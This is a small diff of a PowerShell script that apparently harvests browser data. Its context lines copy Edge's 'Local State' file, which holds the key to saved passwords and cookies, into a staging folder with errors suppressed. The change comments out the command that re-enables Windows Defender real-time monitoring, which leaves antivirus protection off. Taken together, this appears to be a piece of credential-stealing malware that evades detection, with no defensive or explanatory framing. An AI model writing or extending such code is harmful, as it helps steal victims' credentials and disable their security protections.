@@ -54,6 +54,6 @@ CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
 Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
 
 # Re-enable Windows Defender real-time monitoring (if needed)
-Set-MpPreference -DisableRealtimeMonitoring $false
+#Set-MpPreference -DisableRealtimeMonitoring $false
 
 exit
